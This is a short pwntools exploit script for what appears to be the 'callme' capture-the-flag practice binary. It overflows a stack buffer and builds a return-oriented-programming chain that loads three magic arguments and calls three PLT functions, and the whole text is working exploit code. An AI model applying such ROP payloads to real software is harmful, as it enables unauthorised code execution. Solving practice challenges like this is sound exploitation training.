from pwn import*
p=process('./callme')
elf=ELF('./callme')

callme1=elf.plt['callme_one']
callme2=elf.plt['callme_two']
callme3=elf.plt['callme_three']
pop_rdi_rsi_rdx=0x40093c

t=p64(0xDEADBEEFDEADBEEF)+p64(0xCAFEBABECAFEBABE)+p64(0xD00DF00DD00DF00D)
payload=b'a'*40
payload+=p64(pop_rdi_rsi_rdx)+t+p64(callme1)
payload+=p64(pop_rdi_rsi_rdx)+t+p64(callme2)
payload+=p64(pop_rdi_rsi_rdx)+t+p64(callme3)
p.sendline(payload)
p.interactive()